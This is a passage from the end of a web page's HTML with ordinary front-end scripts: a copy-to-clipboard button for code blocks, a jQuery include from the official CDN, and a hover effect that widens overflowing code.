            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) {
            }
            ;
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild === container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName === "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>

<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
<script>
    $("code[class^=language] ").on("mouseover", function () {
        if (this.clientWidth < this.scrollWidth) {
            $(this).css("width", "135%")
        }
    }).on("mouseout", function () {
        $(this).css("width", "100%")
    })
</script>
</body>

</html>
